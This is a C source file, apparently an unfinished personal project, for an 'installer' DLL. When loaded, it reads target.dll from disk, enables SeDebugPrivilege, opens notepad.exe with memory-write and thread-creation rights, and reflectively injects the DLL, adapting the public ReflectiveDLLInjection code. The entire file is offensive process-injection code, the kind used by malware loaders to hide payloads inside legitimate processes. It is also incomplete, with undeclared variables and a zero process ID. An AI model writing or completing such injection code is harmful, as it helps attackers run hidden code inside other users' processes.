/* should compile into installer_x64.dll or installer_x86.dll depending on target os */
// LoadRemoteLibraryR() equivalent goes in here

#include "installer.h"

// TODO: manually resolve all these windows api calls


// Adapted from:
// https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/inject/src/Inject.c
void start()
{
	// do while loop start // TODO: add this if i want the ability to add error handling with break statements?


	// TODO: 
	// look for target.dll within the .data section of the current PE file (installer.dll).
	// if doing this way, i will probs have to parse _IMAGE_SECTION_HEADER and find the start
	// address of the section where i embedded the target.dll (in this case it should be the .data section)
	// PE Format: https://github.com/fancycode/MemoryModule/blob/master/doc/readme.rst


	// look for target.dll on disk?
	char* targetDll = "target.dll"; // host.dll


	// process to inject host.dll into
	char* host_process = "notepad.exe";
	// obtain target process id... TODO: 
	DWORD dwProcessId = 0;

	// open dll file from the disk
	HANDLE hFile = CreateFileA(targetDll, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	// get size of targetDll
	dwLength = GetFileSize(hFile, NULL);

	// allocate memory to write targetDll into memory
	lpBuffer = HeapAlloc(GetProcessHeap(), 0, dwLength);

	// reads the entire dll into memory
	ReadFile(hFile, lpBuffer, dwLength, &dwBytesRead, NULL);

	// get process token so we can change permissions of the process to allow us to open and inject into another process
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		// enable the SedebugPrivellege
		priv.PrivilegeCount           = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
		{
			AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL  );
		}
		CloseHandle( hToken  );
	}
	

	// Opens the target process with rights to write memory and create remote threads
	hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);

	// Calls LoadRemoteLibraryR to perform reflective DLL injection
	// Loads targetDll into memory
	hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);
	hModule = LoadLibraryManual(hProcess, lpBuffer, dwLength, NULL);

	// Waits for the remote thread to finish
	WaitForSingleObject(hModule, INFINITE);
	// do while loop end // TODO: add this if i want the ability to add error handling with break statements?

	// memory cleanup
	if(lpBuffer)
	{
		HeapFree(GetProcessHeap(), 0, lpBuffer);
	}

	if(hProcess)
	{
		CloseHandle(hProcess);
	}
}



BOOL WINAPI DllMain(
		HINSTANCE hinstDLL,  // handle to DLL module
		DWORD fdwReason,     // reason for calling function
		LPVOID lpvReserved )  // reserved
{
	// Perform actions based on the reason for calling.
	switch( fdwReason ) 
	{ 
		case DLL_PROCESS_ATTACH:
			// Initialize once for each new process.
			// Return FALSE to fail DLL load.
			start();
			break;

		case DLL_THREAD_ATTACH:
			// Do thread-specific initialization.
			break;

		case DLL_THREAD_DETACH:
			// Do thread-specific cleanup.
			break;

		case DLL_PROCESS_DETACH:

			if (lpvReserved != nullptr)
			{
				break; // do not do cleanup if process termination scenario
			}

			// Perform any necessary cleanup.
			break;
	}
	return TRUE;  // Successful DLL_PROCESS_ATTACH.
}
